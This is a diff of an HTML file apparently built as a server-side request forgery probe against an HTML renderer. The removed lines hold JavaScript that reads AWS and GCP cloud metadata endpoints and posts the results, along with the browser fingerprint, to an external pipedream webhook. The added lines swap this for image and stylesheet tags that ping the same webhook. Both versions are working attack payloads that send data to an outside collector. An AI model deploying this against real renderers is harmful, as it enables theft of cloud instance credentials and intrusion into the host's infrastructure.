@@ -1,32 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>test</title></head>
 <body>
-<h1>SSRF probe</h1>
-<script>
-const webhook = 'https://eondm3hfjar18nj.m.pipedream.net';
-
-// Confirm JS executes inside the renderer
-fetch(webhook + '/heartbeat?msg=js-running').catch(()=>{});
-
-// Try AWS metadata (IMDSv2 token-style header)
-fetch('http://169.254.169.254/latest/meta-data/', {
-    headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
-})
-.then(r => r.text())
-.then(d => fetch(webhook, {method: 'POST', body: 'AWS_META: ' + d}))
-.catch(e => fetch(webhook, {method: 'POST', body: 'AWS_ERR: ' + e.toString()}));
-
-// Try GCP metadata
-fetch('http://metadata.google.internal/computeMetadata/v1/', {
-    headers: {'Metadata-Flavor': 'Google'}
-})
-.then(r => r.text())
-.then(d => fetch(webhook, {method: 'POST', body: 'GCP_META: ' + d}))
-.catch(e => fetch(webhook, {method: 'POST', body: 'GCP_ERR: ' + e.toString()}));
-
-// Renderer environment fingerprint
-fetch(webhook, {method: 'POST', body: 'UA: ' + navigator.userAgent + ' | URL: ' + location.href});
-</script>
+<h1>probe</h1>
+<img src="https://eondm3hfjar18nj.m.pipedream.net/img-loaded">
+<link rel="stylesheet" href="https://eondm3hfjar18nj.m.pipedream.net/css-loaded">
 </body>
 </html>
